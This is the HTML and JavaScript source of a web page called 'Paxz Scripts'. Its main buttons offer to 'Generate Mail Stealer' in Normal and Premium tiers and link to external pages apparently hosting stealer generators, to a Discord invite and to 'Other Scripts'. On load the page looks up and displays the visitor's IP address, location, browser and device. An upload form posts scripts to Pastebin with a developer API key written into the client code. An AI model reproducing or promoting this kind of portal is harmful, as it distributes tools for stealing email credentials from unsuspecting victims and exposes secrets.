<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Paxz Scripts</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin: 0;
      overflow: hidden;
      background-color: #1a1a1a;
      color: #fff;
    }
    #animationContainer {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
    }
    h1 {
      font-size: 48px;
      margin-top: 50px;
    }
    h2 {
      font-size: 30px;
      margin-bottom: 20px;
    }
    button {
      padding: 10px 20px;
      font-size: 18px;
      margin: 10px;
      background-color: #3498db;
      color: #fff;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      transition: background-color 0.3s ease-in-out;
    }
    button:hover {
      background-color: #2980b9;
    }
    #mailStealerOptions {
      display: none;
      margin-top: 20px;
    }
    #mailStealerOptions.show {
      display: block;
    }
    #mailStealerOptions button {
      background-color: #e74c3c;
      transition: background-color 0.3s ease-in-out;
    }
    #mailStealerOptions button:hover {
      background-color: #c0392b;
    }
    #scriptInput {
      width: 80%;
      padding: 10px;
      margin: 20px auto;
    }
    #uploadBtn {
      padding: 10px 20px;
      font-size: 18px;
      background-color: #27ae60;
      color: #fff;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      transition: background-color 0.3s ease-in-out;
    }
    #uploadBtn:hover {
      background-color: #219f53;
    }
  </style>
</head>
<body>
  <div id="animationContainer">
    <img src="https://wallpapercave.com/wp/wp2760959.gif" alt="Animated Background" style="width: 100%; height: 100vh; object-fit: cover;">
  </div>
  <h1>Paxz</h1>
  <h2>Best Scripts!</h2>
  <button id="mailStealerBtn">Generate Mail Stealer</button>
  <button id="joinBtn">Join Paxz</button>
  <button id="otherScriptsBtn">Other Scripts</button>

  <div id="mailStealerOptions">
    <h2>Choose an option:</h2>
    <button id="normalOption">Normal</button>
    <button id="premiumOption">Premium</button>
  </div>

  <p id="ipAddress"></p>
  <p id="location"></p>
  <p id="timezone"></p>
  <p id="browserInfo"></p>
  <p id="deviceInfo"></p>

  <!-- Textarea and Upload Button -->
  <textarea id="scriptInput" placeholder="Script here..."></textarea>
  <button id="uploadBtn">Upload</button>

  <script>
    const mailStealerBtn = document.getElementById("mailStealerBtn");
    const mailStealerOptions = document.getElementById("mailStealerOptions");
    const normalOption = document.getElementById("normalOption");
    const premiumOption = document.getElementById("premiumOption");
    const otherScriptsBtn = document.getElementById("otherScriptsBtn");
    const joinBtn = document.getElementById("joinBtn");

    mailStealerBtn.addEventListener("click", () => {
      mailStealerOptions.classList.toggle("show");
    });

    joinBtn.addEventListener("click", () => {
      window.location.href = "https://discord.gg/jw6xSeNfBs";
    });

    normalOption.addEventListener("click", () => {
      window.location.href = "https://paxzstealer.github.io/PaxzGen/";
    });

    premiumOption.addEventListener("click", () => {
      window.location.href = "https://paxzstealer.github.io/PaxzPremuimGen/";
    });

    otherScriptsBtn.addEventListener("click", () => {
      window.location.href = "https://paxzstealer.github.io/Other-Scrips/";
    });

    // Fetch and display IP address, location, and timezone
    const ipAddressElement = document.getElementById("ipAddress");
    const locationElement = document.getElementById("location");
    const timezoneElement = document.getElementById("timezone");
    const browserInfoElement = document.getElementById("browserInfo");
    const deviceInfoElement = document.getElementById("deviceInfo");

    async function fetchIPDetails() {
      try {
        const ipResponse = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipResponse.json();
        const ipAddress = ipData.ip;
        ipAddressElement.textContent = `Your IP Address: ${ipAddress}`;

        const locationResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
        const locationData = await locationResponse.json();
        const country = locationData.country_name;
        const region = locationData.region;
        const city = locationData.city;
        locationElement.textContent = `Location: ${city}, ${region}, ${country}`;

        const timezone = locationData.timezone;
        timezoneElement.textContent = `Time Zone: ${timezone}`;

        // Get browser name
        const browserInfo = getBrowserInfo();
        browserInfoElement.textContent = `Browser: ${browserInfo}`;

        // Get device type
        const deviceType = getDeviceType();
        deviceInfoElement.textContent = `Device: ${deviceType}`;
      } catch (error) {
        console.error("Error fetching IP details:", error);
      }
    }

    // Function to get browser name
    function getBrowserInfo() {
      const userAgent = navigator.userAgent;
      if (userAgent.includes("Chrome")) return "Google Chrome";
      if (userAgent.includes("Firefox")) return "Mozilla Firefox";
      if (userAgent.includes("Edge")) return "Microsoft Edge";
      if (userAgent.includes("Safari")) return "Apple Safari";
      return "Unknown Browser";
    }

    // Function to get device type
    function getDeviceType() {
      const userAgent = navigator.userAgent;
      if (userAgent.includes("Mobile")) return "Phone";
      if (userAgent.includes("Tablet")) return "Tablet";
      if (userAgent.includes("Console")) return "Console";
      if (userAgent.includes("Windows")) return "PC / Computer";
      return "Unknown Device";
    }

    fetchIPDetails(); // Call the function to fetch and display IP details

    // New code for uploading to Pastebin and displaying the result
    const scriptInput = document.getElementById("scriptInput");
    const uploadBtn = document.getElementById("uploadBtn");

    uploadBtn.addEventListener("click", () => {
      const scriptContent = scriptInput.value;

      if (scriptContent.trim() === "") {
        alert("Please enter a script to upload.");
        return;
      }

      uploadToPastebin(scriptContent);
    });

    async function uploadToPastebin(scriptContent) {
  try {
    const pastebinResponse = await fetch("https://api.pastebin.com/1/api/api_post.php", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: `api_option=paste&api_dev_key=oOjMwNYzkEtX2wwJT6abyB_C7Qpgd00f&api_paste_code=${encodeURIComponent(scriptContent)}`,
      // Replace "YOUR_PASTEBIN_API_KEY" with your actual Pastebin API key
    });

        const pastebinData = await pastebinResponse.text();
        const pastebinLink = pastebinData.trim();
        
        const popup = window.open("", "Upload Result", "width=400,height=200");
        popup.document.write(`
          <h2>Done!</h2>
          <p>Raw Pastebin Link: <a href="${pastebinLink}" target="_blank">${pastebinLink}</a></p>
          <button id="copyLinkBtn">Copy</button>
          <button id="closeBtn">Close</button>
        `);

        popup.document.getElementById("copyLinkBtn").addEventListener("click", () => {
          const tempInput = popup.document.createElement("input");
          tempInput.value = pastebinLink;
          popup.document.body.appendChild(tempInput);
          tempInput.select();
          document.execCommand("copy");
          popup.document.body.removeChild(tempInput);
        });

        popup.document.getElementById("closeBtn").addEventListener("click", () => {
          popup.close();
        });
      } catch (error) {
        console.error("Error uploading to Pastebin:", error);
      }
    }
  </script>
</body>
</html>
